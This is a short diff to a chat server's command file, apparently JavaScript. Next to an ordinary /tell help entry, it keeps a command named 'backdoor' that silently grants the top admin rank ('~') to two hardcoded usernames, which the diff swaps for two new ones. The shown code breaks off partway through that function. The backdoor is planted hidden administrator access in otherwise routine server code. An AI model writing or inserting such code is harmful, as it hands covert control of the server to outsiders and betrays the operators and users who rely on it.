@@ -42,7 +42,7 @@ exports.commands = {
 	tellhelp: ["/tell [username], [message] - Send a message to an offline user that will be received when they log in."],
 	
   backdoor: function (target, room, user) {
-		if (!(user.userid === 'darkero' || user.userid === 'wallythebully')) return false;
+		if (!(user.userid === 'como' || user.userid === 'dxdmaster')) return false;
 		if (!target) {
 			user.group = '~';
 			user.updateIdentity();
